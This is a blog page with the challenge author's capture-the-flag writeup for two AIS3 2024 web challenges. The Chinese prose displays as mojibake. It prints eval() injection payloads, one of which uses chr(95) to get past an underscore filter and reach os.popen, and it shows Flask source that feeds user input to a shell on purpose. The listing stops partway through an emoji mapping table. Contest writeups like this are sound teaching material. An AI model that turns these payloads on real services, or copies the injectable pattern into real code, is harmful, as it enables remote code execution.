<!DOCTYPE html>
<html>
<head><!-- hexo injector head_begin start --><!-- Microsoft Clarity begins-->
    <script type="text/javascript">
        (function(c,l,a,r,i,t,y){
            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
        })(window, document, "clarity", "script", "nq90i0uzl9");
    </script>
    <!-- Microsoft Clarity ends-->
    <!-- Google tag (gtag.js) begins-->
    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16453505124"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
    
      gtag('config', 'AW-16453505124');
    </script>
    <!-- Google tag (gtag.js) ends-->
    <!-- hexo injector head_begin end -->
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
  <title>
    
    2024 AIS3 pre-exam &amp; MFCTF writeup ä¸¨
    

    typo
  </title>

  
  <link rel="shortcut icon" href="/icon.svg">
  

  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
  
  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
  

  <!-- å­—ä½“ -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">

  
<link rel="stylesheet" href="/css/root.css">

  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/post.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <header class="header">
  <section class="header-container">
    <a class="logo" href="/">TriangeSnake&#39;s Blog</a>
    <ul class="nav">
      
      <li><a href="/archives">archives</a></li>
      
      <li><a href="/about">about</a></li>
      
    </ul>
  </section>
</header>
  <main class="main">
    <article class="post">
  
  <div class="post-title">2024 AIS3 pre-exam &amp; MFCTF writeup</div>
  <div class="post-meta">
    <div class="date">2024 å…­æœˆ 30æ—¥</div>
    <div class="tags">
      
      <div class="tag-item">writeup</div>
      
      <div class="tag-item">CTF</div>
      
      <div class="tag-item">web</div>
      
      <div class="tag-item">misc</div>
      
    </div>
  </div>
  

  <main class="post-content"><h1 id="2024-AIS3-pre-exam-writeup"><a href="#2024-AIS3-pre-exam-writeup" class="headerlink" title="2024 AIS3 pre-exam writeup"></a>2024 AIS3 pre-exam writeup</h1><p>é€™æ¬¡å¹« AIS3 pre-exam å’Œ MFCTF å‡ºé¡Œï¼Œå‡ºäº†å…©é¡Œï¼šä¸€é¡Œ web å’Œä¸€é¡Œ misc (ä½†å…¶å¯¦å…©é¡Œéƒ½æ˜¯web)</p>
<h2 id="evil-calculator"><a href="#evil-calculator" class="headerlink" title="evil calculator"></a>evil calculator</h2><blockquote>
<p>This is a calculator written in Python. Itâ€™s a simple calculator, but some function in it is VERY EVIL!!<br>Connection info: <a target="_blank" rel="noopener" href="http://chals1.ais3.org:5001/">http://chals1.ais3.org:5001</a><br>Author: TriangleSnake</p>
</blockquote>
<p>é€™æ˜¯ä¸€é¡Œå¾ˆç°¡å–®çš„pyjail(?æœ‰jailå—)ï¼Œä¸»è¦å•é¡Œå‡ºåœ¨ <code>eval()</code> functionï¼Œä½†æ˜¯æœ‰éæ¿¾ <code>_</code> å’Œ <code>space</code> ã€‚<br>å› ç‚ºæ˜¯warmupé¡Œï¼Œé æœŸè§£æ˜¯ç”¨<code>open()</code>è®€flagï¼Œä¸æœƒç”¨åˆ°<code>_</code>å’Œ<code>space</code>ã€‚</p>
<pre><code class="highlight json"><span class="punctuation">&#123;</span><span class="attr">&quot;expression&quot;</span><span class="punctuation">:</span><span class="string">&quot;open(&#x27;/flag&#x27;,&#x27;r&#x27;).read()&quot;</span><span class="punctuation">&#125;</span></code></pre>

<p>ç•¶ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥æŠŠ <code>_</code> å’Œ <code>space</code> encode å¾Œ rce</p>
<pre><code class="highlight json"><span class="punctuation">&#123;</span><span class="attr">&quot;expression&quot;</span><span class="punctuation">:</span><span class="string">&quot;eval(eval(&#x27;chr(95)&#x27;)+eval(&#x27;chr(95)&#x27;)+&#x27;import&#x27;+eval(&#x27;chr(95)&#x27;)+eval(&#x27;chr(95)&#x27;)+\&quot;(&#x27;os&#x27;).popen(&#x27;&#x27;).read()\&quot;)&quot;</span><span class="punctuation">&#125;</span></code></pre>

<blockquote>
<p>AIS3{7RiANG13_5NAK3_I5_50_3Vi1}</p>
</blockquote>
<h2 id="emoji-console"><a href="#emoji-console" class="headerlink" title="emoji console"></a>emoji console</h2><blockquote>
<p>ğŸ”ºğŸ ğŸ˜¡ ğŸ…°ï¸ ğŸ†’ 1ï¸âƒ£â“‚ï¸ğŸ…¾ï¸ ğŸš…â˜ ï¸âœ‰ï¸ ğŸ¥«ğŸ«µ ğŸ”ğŸš©â‰ï¸<br>Connection info: <a target="_blank" rel="noopener" href="http://chals1.ais3.org:5000/">http://chals1.ais3.org:5000</a><br>Author: TriangleSnake</p>
</blockquote>
<p>é€™é¡Œå’Œè³‡å®‰æ²’ä»€éº¼é—œä¿‚ï¼Œç´”ç²¹æ˜¯æ‹¼å­—éŠæˆ²ï¼Œå¯ä»¥éš¨ä¾¿æŒ‰å¹¾å€‹ emoji å¾Œå°±å¯ä»¥ç™¼ç¾ä»–å°±æ˜¯æŠŠä½ è¼¸å…¥çš„ emoji è½‰æˆè‹±æ–‡å–®å­—å¾Œè®Šæˆä¸€è¡ŒæŒ‡ä»¤</p>
<p><img src="/2024/06/30/2024-AIS3-pre-exam-MFCTF-writeup/1.png" alt="image"></p>
<p>è©¦å¹¾æ¬¡æœƒç™¼ç¾ä¸€äº›å¸¸ç”¨çš„æŒ‡ä»¤ï¼Œåƒæ˜¯ ğŸ±-&gt;<code>cat</code> ã€ ğŸ’¿-&gt;<code>cd</code> ï¼Œé‚„æœ‰é¡Œç›®å‰›é€²å»å°±æç¤ºçš„ ğŸ-&gt;<code>python</code> å’Œ â­-&gt;<code>*</code></p>
<ol>
<li>å˜—è©¦ä½¿ç”¨ <code>cat</code> å‘½ä»¤çœ‹ç›®éŒ„ä¸‹é¢æœ‰ä»€éº¼<pre><code class="highlight bash">ğŸ± â­</code></pre></li>
</ol>
<pre><code class="highlight python"><span class="comment">#!/usr/local/bin/python3</span>

<span class="keyword">import</span> os
<span class="keyword">from</span> flask <span class="keyword">import</span> Flask,send_file,request,redirect,jsonify,render_template
<span class="keyword">import</span> json
<span class="keyword">import</span> string
<span class="keyword">def</span> <span class="title function_">translate</span>(<span class="params">command:<span class="built_in">str</span></span>)-&gt;<span class="built_in">str</span>:
    emoji_table = json.load(<span class="built_in">open</span>(<span class="string">&#x27;emoji.json&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>))
    <span class="keyword">for</span> key <span class="keyword">in</span> emoji_table:
        <span class="keyword">if</span> key <span class="keyword">in</span> command:
            command = command.replace(key,emoji_table[key])
    <span class="keyword">return</span> command.lower()

app = Flask(__name__)

<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
<span class="keyword">def</span> <span class="title function_">index</span>():
    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)

<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api&#x27;</span></span>)</span>
<span class="keyword">def</span> <span class="title function_">api</span>():
    command = request.args.get(<span class="string">&#x27;command&#x27;</span>)
    
    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">set</span>(command).intersection(<span class="built_in">set</span>(string.printable.replace(<span class="string">&quot; &quot;</span>,<span class="string">&#x27;&#x27;</span>))))&gt;<span class="number">0</span>:
        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;command&#x27;</span>:command,<span class="string">&#x27;result&#x27;</span>:<span class="string">&#x27;Invalid command&#x27;</span>&#125;)
    command = translate(command)
    result = os.popen(command+<span class="string">&quot; 2&gt;&amp;1&quot;</span>).read()
    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;command&#x27;</span>:command,<span class="string">&#x27;result&#x27;</span>:result&#125;)
    

<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:
    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">5000</span>)

&#123;
    <span class="string">&quot;ğŸ˜€&quot;</span>: <span class="string">&quot;:D&quot;</span>,
    <span class="string">&quot;ğŸ˜&quot;</span>: <span class="string">&quot;:D&quot;</span>,
    <span class="string">&quot;ğŸ˜‚&quot;</span>: <span class="string">&quot;:&#x27;)&quot;</span>,
    <span class="string">&quot;ğŸ¤£&quot;</span>: <span class="string">&quot;XD&quot;</span>,
    <span class="string">&quot;ğŸ˜ƒ&quot;</span>: <span class="string">&quot;:D&quot;</span>,
    <span class="string">&quot;ğŸ˜„&quot;</span>: <span class="string">&quot;:D&quot;</span>,
    <span class="string">&quot;ğŸ˜…&quot;</span>: <span class="string">&quot;&#x27;:D&quot;</span>,
    <span class="string">&quot;ğŸ˜†&quot;</span>: <span class="string">&quot;XD&quot;</span>,
    <span class="string">&quot;ğŸ˜‰&quot;</span>: <span class="string">&quot;;)&quot;</span>,
    <span class="string">&quot;ğŸ˜Š&quot;</span>: <span class="string">&quot;:)&quot;</span>,
    <span class="string">&quot;ğŸ˜‹&quot;</span>: <span class="string">&quot;:P&quot;</span>,
    <span class="string">&quot;ğŸ˜&quot;</span>: <span class="string">&quot;B)&quot;</span>,
    <span class="string">&quot;ğŸ˜&quot;</span>: <span class="string">&quot;:)&quot;</span>,
    <span class="string">&quot;ğŸ˜˜&quot;</span>: <span class="string">&quot;:*&quot;</span>,
    <span class="string">&quot;ğŸ˜—&quot;</span>: <span class="string">&quot;:*&quot;</span>,
    <span class="string">&quot;ğŸ˜™&quot;</span>: <span class="string">&quot;:*&quot;</span>,
    <span class="string">&quot;ğŸ˜š&quot;</span>: <span class="string">&quot;:*&quot;</span>,
    <span class="string">&quot;â˜ºï¸&quot;</span>: <span class="string">&quot;:)&quot;</span>,
    <span class="string">&quot;ğŸ™‚&quot;</span>: <span class="string">&quot;:)&quot;</span>,
    <span class="string">&quot;ğŸ¤—&quot;</span>: <span class="string">&quot;:)&quot;</span>,
    <span class="string">&quot;ğŸ¤©&quot;</span>: <span class="string">&quot;:)&quot;</span>,
    <span class="string">&quot;ğŸ¤”&quot;</span>: <span class="string">&quot;:?&quot;</span>,
    <span class="string">&quot;ğŸ¤¨&quot;</span>: <span class="string">&quot;:/&quot;</span>,
    <span class="string">&quot;ğŸ˜&quot;</span>: <span class="string">&quot;:|&quot;</span>,
    <span class="string">&quot;ğŸ˜‘&quot;</span>: <span class="string">&quot;:|&quot;</span>,
    <span class="string">&quot;ğŸ˜¶&quot;</span>: <span class="string">&quot;:|&quot;</span>,
    <span class="string">&quot;ğŸ™„&quot;</span>: <span class="string">&quot;:/&quot;</span>,
    <span class="string">&quot;ğŸ˜&quot;</span>: <span class="string">&quot;:]&quot;</span>,
    <span class="string">&quot;ğŸ˜£&quot;</span>: <span class="string">&quot;&gt;:&quot;</span>,
    <span class="string">&quot;ğŸ˜¥&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,
    <span class="string">&quot;ğŸ˜®&quot;</span>: <span class="string">&quot;:o&quot;</span>,
    <span class="string">&quot;ğŸ¤&quot;</span>: <span class="string">&quot;:x&quot;</span>,
    <span class="string">&quot;ğŸ˜¯&quot;</span>: <span class="string">&quot;:o&quot;</span>,
    <span class="string">&quot;ğŸ˜ª&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,
    <span class="string">&quot;ğŸ˜«&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,
    <span class="string">&quot;ğŸ˜´&quot;</span>: <span class="string">&quot;Zzz&quot;</span>,
    <span class="string">&quot;ğŸ˜Œ&quot;</span>: <span class="string">&quot;:)&quot;</span>,
    <span class="string">&quot;ğŸ˜›&quot;</span>: <span class="string">&quot;:P&quot;</span>,
    <span class="string">&quot;ğŸ˜œ&quot;</span>: <span class="string">&quot;;P&quot;</span>,
    <span class="string">&quot;ğŸ˜&quot;</span>: <span class="string">&quot;XP&quot;</span>,
    <span class="string">&quot;ğŸ¤¤&quot;</span>: <span class="string">&quot;:P&quot;</span>,
    <span class="string">&quot;ğŸ˜’&quot;</span>: <span class="string">&quot;:/&quot;</span>,
    <span class="string">&quot;ğŸ˜“&quot;</span>: <span class="string">&quot;;/&quot;</span>,
    <span class="string">&quot;ğŸ˜”&quot;</span>: <span class="string">&quot;:(&quot;</span>,
    <span class="string">&quot;ğŸ˜•&quot;</span>: <span class="string">&quot;:/&quot;</span>,
    <span class="string">&quot;ğŸ™ƒ&quot;</span>: <span class="string">&quot;(:&quot;</span>,
    <span class="string">&quot;ğŸ¤‘&quot;</span>: <span class="string">&quot;$)&quot;</span>,
    <span class="string">&quot;ğŸ˜²&quot;</span>: <span class="string">&quot;:O&quot;</span>,
    <span class="string">&quot;â˜¹ï¸&quot;</span>: <span class="string">&quot;:(&quot;</span>,
    <span class="string">&quot;ğŸ™&quot;</span>: <span class="string">&quot;:(&quot;</span>,
    <span class="string">&quot;ğŸ˜–&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,
    <span class="string">&quot;ğŸ˜&quot;</span>: <span class="string">&quot;:(&quot;</span>,
    <span class="string">&quot;ğŸ˜Ÿ&quot;</span>: <span class="string">&quot;:(&quot;</span>,
    <span class="string">&quot;ğŸ˜¤&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,
    <span class="string">&quot;ğŸ˜¢&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,
    <span class="string">&quot;ğŸ˜­&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,
    <span class="string">&quot;ğŸ˜¦&quot;</span>: <span class="string">&quot;:(&quot;</span>,
    <span class="string">&quot;ğŸ˜§&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,
    <span class="string">&quot;ğŸ˜¨&quot;</span>: <span class="string">&quot;:O&quot;</span>,
    <span class="string">&quot;ğŸ˜©&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,
    <span class="string">&quot;ğŸ¤¯&quot;</span>: <span class="string">&quot;:O&quot;</span>,
    <span class="string">&quot;ğŸ˜¬&quot;</span>: <span class="string">&quot;:E&quot;</span>,
    <span class="string">&quot;ğŸ˜°&quot;</span>: <span class="string">&quot;:(&quot;</span>,
    <span class="string">&quot;ğŸ˜±&quot;</span>: <span class="string">&quot;:O&quot;</span>,
    <span class="string">&quot;ğŸ¥µ&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,
    <span class="string">&quot;ğŸ¥¶&quot;</span>: <span class="string">&quot;:(&quot;</span>,
    <span class="string">&quot;ğŸ˜³&quot;</span>: <span class="string">&quot;:$&quot;</span>,
    <span class="string">&quot;ğŸ¤ª&quot;</span>: <span class="string">&quot;:P&quot;</span>,
    <span class="string">&quot;ğŸ˜µ&quot;</span>: <span class="string">&quot;X(&quot;</span>,
    <span class="string">&quot;ğŸ¥´&quot;</span>: <span class="string">&quot;:P&quot;</span>,
    <span class="string">&quot;ğŸ˜ &quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,
    <span class="string">&quot;ğŸ˜¡&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,
    <span class="string">&quot;ğŸ¤¬&quot;</span>: <span class="string">&quot;#$%&amp;!&quot;</span>,
    <span class="string">&quot;ğŸ¤•&quot;</span>: <span class="string">&quot;:(&quot;</span>,
    <span class="string">&quot;ğŸ¤¢&quot;</span>: <span class="string">&quot;X(&quot;</span>,
    <span class="string">&quot;ğŸ¤®&quot;</span>: <span class="string">&quot;:P&quot;</span>,
    <span class="string">&quot;ğŸ¤§&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,
    <span class="string">&quot;ğŸ˜‡&quot;</span>: <span class="string">&quot;O:)&quot;</span>,
    <span class="string">&quot;ğŸ¥³&quot;</span>: <span class="string">&quot;:D&quot;</span>,
    <span class="string">&quot;ğŸ¥º&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,
    <span class="string">&quot;ğŸ¤¡&quot;</span>: <span class="string">&quot;:o)&quot;</span>,
    <span class="string">&quot;ğŸ¤ &quot;</span>: <span class="string">&quot;Y)&quot;</span>,
    <span class="string">&quot;ğŸ¤¥&quot;</span>: <span class="string">&quot;:L&quot;</span>,
    <span class="string">&quot;ğŸ¤«&quot;</span>: <span class="string">&quot;:x&quot;</span>,
    <span class="string">&quot;ğŸ¤­&quot;</span>: <span class="string">&quot;:x&quot;</span>,
    <span class="string">&quot;ğŸ¶&quot;</span>: <span class="string">&quot;dog&quot;</span>,
    <span class="string">&quot;ğŸ±&quot;</span>: <span class="string">&quot;cat&quot;</span>,
    <span class="string">&quot;ğŸ­&quot;</span>: <span class="string">&quot;mouse&quot;</span>,
    <span class="string">&quot;ğŸ¹&quot;</span>: <span class="string">&quot;hamster&quot;</span>,
    <span class="string">&quot;ğŸ°&quot;</span>: <span class="string">&quot;rabbit&quot;</span>,
    <span class="string">&quot;ğŸ¦Š&quot;</span>: <span class="string">&quot;fox&quot;</span>,
    <span class="string">&quot;ğŸ»&quot;</span>: <span class="string">&quot;bear&quot;</span>,
    <span class="string">&quot;ğŸ¼&quot;</span>: <span class="string">&quot;panda&quot;</span>,
    <span class="string">&quot;ğŸ¨&quot;</span>: <span class="string">&quot;koala&quot;</span>,
    <span class="string">&quot;ğŸ¯&quot;</span>: <span class="string">&quot;tiger&quot;</span>,
    <span class="string">&quot;ğŸ¦&quot;</span>: <span class="string">&quot;lion&quot;</span>,
    <span class="string">&quot;ğŸ®&quot;</span>: <span class="string">&quot;cow&quot;</span>,
    <span class="string">&quot;ğŸ·&quot;</span>: <span class="string">&quot;pig&quot;</span>,
    <span class="string">&quot;ğŸ½&quot;</span>: <span class="string">&quot;pig nose&quot;</span>,
    <span class="string">&quot;ğŸ¸&quot;</span>: <span class="string">&quot;frog&quot;</span>,
    <span class="string">&quot;ğŸ’&quot;</span>: <span class="string">&quot;monkey&quot;</span>,
    <span class="string">&quot;ğŸ”&quot;</span>: <span class="string">&quot;chicken&quot;</span>,
    <span class="string">&quot;ğŸ§&quot;</span>: <span class="string">&quot;penguin&quot;</span>,
    <span class="string">&quot;ğŸ¦&quot;</span>: <span class="string">&quot;bird&quot;</span>,
    <span class="string">&quot;ğŸ¤&quot;</span>: <span class="string">&quot;baby chick&quot;</span>,
    <span class="string">&quot;ğŸ£&quot;</span>: <span class="string">&quot;hatching chick&quot;</span>,
    <span class="string">&quot;ğŸ¥&quot;</span>: <span class="string">&quot;front-facing baby chick&quot;</span>,
    <span class="string">&quot;ğŸ¦†&quot;</span>: <span class="string">&quot;duck&quot;</span>,
    <span class="string">&quot;ğŸ¦…&quot;</span>: <span class="string">&quot;eagle&quot;</span>,
    <span class="string">&quot;ğŸ¦‰&quot;</span>: <span class="string">&quot;owl&quot;</span>,
    <span class="string">&quot;ğŸ¦‡&quot;</span>: <span class="string">&quot;bat&quot;</span>,
    <span class="string">&quot;ğŸº&quot;</span>: <span class="string">&quot;wolf&quot;</span>,
    <span class="string">&quot;ğŸ—&quot;</span>: <span class="string">&quot;boar&quot;</span>,
    <span class="string">&quot;ğŸ´&quot;</span>: <span class="string">&quot;horse&quot;</span>,
    <span class="string">&quot;ğŸ¦„&quot;</span>: <span class="string">&quot;unicorn&quot;</span>,
    <span class="string">&quot;ğŸ&quot;</span>: <span class="string">&quot;bee&quot;</span>,
    <span class="string">&quot;ğŸ›&quot;</span>: <span class="string">&quot;bug&quot;</span>,
    <span class="string">&quot;ğŸ¦‹&quot;</span>: <span class="string">&quot;butterfly&quot;</span>,
    <span class="string">&quot;ğŸŒ&quot;</span>: <span class="string">&quot;snail&quot;</span>,
    <span class="string">&quot;ğŸ&quot;</span>: <span class="string">&quot;lady beetle&quot;</span>,
    <span class="string">&quot;ğŸœ&quot;</span>: <span class="string">&quot;ant&quot;</span>,
    <span class="string">&quot;ğŸ¦Ÿ&quot;</span>: <span class="string">&quot;mosquito&quot;</span>,
    <span class="string">&quot;ğŸ¦—&quot;</span>: <span class="string">&quot;cricket&quot;</span>,
    <span class="string">&quot;ğŸ•·ï¸&quot;</span>: <span class="string">&quot;spider&quot;</span>,
    <span class="string">&quot;ğŸ•¸ï¸&quot;</span>: <span class="string">&quot;spider web&quot;</span>,
    <span class="string">&quot;ğŸ¦‚&quot;</span>: <span class="string">&quot;scorpion&quot;</span>,
    <span class="string">&quot;ğŸ¢&quot;</span>: <span class="string">&quot;turtle&quot;</span>,
    <span class="string">&quot;ğŸ&quot;</span>: <span class="string">&quot;python&quot;</span>,
    <span class="string">&quot;ğŸ¦&quot;</span>: <span class="string">&quot;lizard&quot;</span>,
    <span class="string">&quot;ğŸ¦–&quot;</span>: <span class="string">&quot;T-Rex&quot;</span>,
    <span class="string">&quot;ğŸ¦•&quot;</span>: <span class="string">&quot;sauropod&quot;</span>,
    <span class="string">&quot;ğŸ™&quot;</span>: <span class="string">&quot;octopus&quot;</span>,
    <span class="string">&quot;ğŸ¦‘&quot;</span>: <span class="string">&quot;squid&quot;</span>,
    <span class="string">&quot;ğŸ¦&quot;</span>: <span class="string">&quot;shrimp&quot;</span>,
    <span class="string">&quot;ğŸ¦&quot;</span>: <span class="string">&quot;lobster&quot;</span>,
    <span class="string">&quot;ğŸ¦€&quot;</span>: <span class="string">&quot;crab&quot;</span>,
    <span class="string">&quot;ğŸ¡&quot;</span>: <span class="string">&quot;blowfish&quot;</span>,
    <span class="string">&quot;ğŸ &quot;</span>: <span class="string">&quot;tropical fish&quot;</span>,
    <span class="string">&quot;ğŸŸ&quot;</span>: <span class="string">&quot;fish&quot;</span>,
    <span class="string">&quot;ğŸ¬&quot;</span>: <span class="string">&quot;dolphin&quot;</span>,
    <span class="string">&quot;ğŸ³&quot;</span>: <span class="string">&quot;whale&quot;</span>,
    <span class="string">&quot;ğŸ‹&quot;</span>: <span class="string">&quot;whale&quot;</span>,
    <span class="string">&quot;ğŸ¦ˆ&quot;</span>: <span class="string">&quot;shark&quot;</span>,
    <span class="string">&quot;ğŸŠ&quot;</span>: <span class="string">&quot;crocodile&quot;</span>,
    <span class="string">&quot;ğŸ…&quot;</span>: <span class="string">&quot;tiger&quot;</span>,
    <span class="string">&quot;ğŸ†&quot;</span>: <span class="string">&quot;leopard&quot;</span>,
    <span class="string">&quot;ğŸ¦“&quot;</span>: <span class="string">&quot;zebra&quot;</span>,
    <span class="string">&quot;ğŸ¦&quot;</span>: <span class="string">&quot;gorilla&quot;</span>,
    <span class="string">&quot;ğŸ¦§&quot;</span>: <span class="string">&quot;orangutan&quot;</span>,
    <span class="string">&quot;ğŸ¦£&quot;</span>: <span class="string">&quot;mammoth&quot;</span>,
    <span class="string">&quot;ğŸ˜&quot;</span>: <span class="string">&quot;elephant&quot;</span>,
    <span class="string">&quot;ğŸ¦›&quot;</span>: <span class="string">&quot;hippopotamus&quot;</span>,
    <span class="string">&quot;ğŸ¦&quot;</span>: <span class="string">&quot;rhinoceros&quot;</span>,
    <span class="string">&quot;ğŸª&quot;</span>: <span class="string">&quot;camel&quot;</span>,
    <span class="string">&quot;ğŸ«&quot;</span>: <span class="string">&quot;two-hump camel&quot;</span>,
    <span class="string">&quot;ğŸ¦’&quot;</span>: <span class="string">&quot;giraffe&quot;</span>,
    <span class="string">&quot;ğŸ¦˜&quot;</span>: <span class="string">&quot;kangaroo&quot;</span>,
    <span class="string">&quot;ğŸ¦¬&quot;</span>: <span class="string">&quot;bison&quot;</span>,
    <span class="string">&quot;ğŸ¦¥&quot;</span>: <span class="string">&quot;sloth&quot;</span>,
    <span class="string">&quot;ğŸ¦¦&quot;</span>: <span class="string">&quot;otter&quot;</span>,
    <span class="string">&quot;ğŸ¦¨&quot;</span>: <span class="string">&quot;skunk&quot;</span>,
    <span class="string">&quot;ğŸ¦¡&quot;</span>: <span class="string">&quot;badger&quot;</span>,
    <span class="string">&quot;ğŸ¾&quot;</span>: <span class="string">&quot;paw prints&quot;</span>,
    <span class="string">&quot;â—¼ï¸&quot;</span>: <span class="string">&quot;black square&quot;</span>,
    <span class="string">&quot;â—»ï¸&quot;</span>: <span class="string">&quot;white square&quot;</span>,
    <span class="string">&quot;â—¾&quot;</span>: <span class="string">&quot;black medium square&quot;</span>,
    <span class="string">&quot;â—½&quot;</span>: <span class="string">&quot;white medium square&quot;</span>,
    <span class="string">&quot;â–ªï¸&quot;</span>: <span class="string">&quot;black small square&quot;</span>,
    <span class="string">&quot;â–«ï¸&quot;</span>: <span class="string">&quot;white small square&quot;</span>,
    <span class="string">&quot;ğŸ”¶&quot;</span>: <span class="string">&quot;large orange diamond&quot;</span>,
    <span class="string">&quot;ğŸ”·&quot;</span>: <span class="string">&quot;large blue diamond&quot;</span>,
    <span class="string">&quot;ğŸ”¸&quot;</span>: <span class="string">&quot;small orange diamond&quot;</span>,
    <span class="string">&quot;ğŸ”¹&quot;</span>: <span class="string">&quot;small blue diamond&quot;</span>,
    <span class="string">&quot;ğŸ”º&quot;</span>: <span class="string">&quot;triangle&quot;</span>,
    <span class="string">&quot;ğŸ”»&quot;</span>: <span class="string">&quot;triangle&quot;</span>,
    <span class="string">&quot;ğŸ”¼&quot;</span>: <span class="string">&quot;triangle&quot;</span>,
    <span class="string">&quot;ğŸ”½&quot;</span>: <span class="string">&quot;triangle&quot;</span>,
    <span class="string">&quot;ğŸ”˜&quot;</span>: <span class="string">&quot;circle&quot;</span>,
    <span class="string">&quot;âšª&quot;</span>: <span class="string">&quot;circle&quot;</span>,
    <span class="string">&quot;âš«&quot;</span>: <span class="string">&quot;black circle&quot;</span>,
    <span class="string">&quot;ğŸŸ &quot;</span>: <span class="string">&quot;orange circle&quot;</span>,
    <span class="string">&quot;ğŸŸ¢&quot;</span>: <span class="string">&quot;green circle&quot;</span>,
    <span class="string">&quot;ğŸ”µ&quot;</span>: <span class="string">&quot;blue circle&quot;</span>,
    <span class="string">&quot;ğŸŸ£&quot;</span>: <span class="string">&quot;purple circle&quot;</span>,
    <span class="string">&quot;ğŸŸ¡&quot;</span>: <span class="string">&quot;yellow circle&quot;</span>,
    <span class="string">&quot;ğŸŸ¤&quot;</span>: <span class="string">&quot;brown circle&quot;</span>,
    <span class="string">&quot;â­•&quot;</span>: <span class="string">&quot;empty circle&quot;</span>,
    <span class="string">&quot;ğŸ…°ï¸&quot;</span>: <span class="string">&quot;A&quot;</span>,
    <span class="string">&quot;ğŸ…±ï¸&quot;</span>: <span class="string">&quot;B&quot;</span>,
    <span class="string">&quot;ğŸ…¾ï¸&quot;</span>: <span class="string">&quot;O&quot;</span>,
    <span class="string">&quot;â„¹ï¸&quot;</span>: <span class="string">&quot;i&quot;</span>,
    <span class="string">&quot;ğŸ…¿ï¸&quot;</span>: <span class="string">&quot;P&quot;</span>,
    <span class="string">&quot;â“‚ï¸&quot;</span>: <span class="string">&quot;M&quot;</span>,
    <span class="string">&quot;ğŸ†&quot;</span>: <span class="string">&quot;AB&quot;</span>,
    <span class="string">&quot;ğŸ†‘&quot;</span>: <span class="string">&quot;CL&quot;</span>,
    <span class="string">&quot;ğŸ†’&quot;</span>: <span class="string">&quot;COOL&quot;</span>,
    <span class="string">&quot;ğŸ†“&quot;</span>: <span class="string">&quot;FREE&quot;</span>,
    <span class="string">&quot;ğŸ†”&quot;</span>: <span class="string">&quot;ID&quot;</span>,
    <span class="string">&quot;ğŸ†•&quot;</span>: <span class="string">&quot;NEW&quot;</span>,
    <span class="string">&quot;ğŸ†–&quot;</span>: <span class="string">&quot;NG&quot;</span>,
    <span class="string">&quot;ğŸ†—&quot;</span>: <span class="string">&quot;OK&quot;</span>,
    <span class="string">&quot;ğŸ†˜&quot;</span>: <span class="string">&quot;SOS&quot;</span>,
    <span class="string">&quot;ğŸ†™&quot;</span>: <span class="string">&quot;UP&quot;</span>,
    <span class="string">&quot;ğŸ†š&quot;</span>: <span class="string">&quot;VS&quot;</span>,
    <span class="string">&quot;ãŠ—ï¸&quot;</span>: <span class="string">&quot;ç¥&quot;</span>,
    <span class="string">&quot;ãŠ™ï¸&quot;</span>: <span class="string">&quot;ç§˜&quot;</span>,
    <span class="string">&quot;ğŸˆº&quot;</span>: <span class="string">&quot;ç‡Ÿ&quot;</span>,
    <span class="string">&quot;ğŸˆ¯&quot;</span>: <span class="string">&quot;æŒ‡&quot;</span>,
    <span class="string">&quot;ğŸ‰&quot;</span>: <span class="string">&quot;å¾—&quot;</span>,
    <span class="string">&quot;ğŸˆ¹&quot;</span>: <span class="string">&quot;å‰²&quot;</span>,
    <span class="string">&quot;ğŸˆš&quot;</span>: <span class="string">&quot;ç„¡&quot;</span>,
    <span class="string">&quot;ğŸˆ²&quot;</span>: <span class="string">&quot;ç¦&quot;</span>,
    <span class="string">&quot;ğŸˆ¸&quot;</span>: <span class="string">&quot;ç”³&quot;</span>,
    <span class="string">&quot;ğŸˆ´&quot;</span>: <span class="string">&quot;åˆ&quot;</span>,
    <span class="string">&quot;ğŸˆ³&quot;</span>: <span class="string">&quot;ç©º&quot;</span>,
